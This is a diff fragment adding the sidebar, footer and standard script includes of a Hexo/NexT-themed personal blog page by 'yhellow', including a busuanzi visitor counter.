+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.5m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">22:58</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
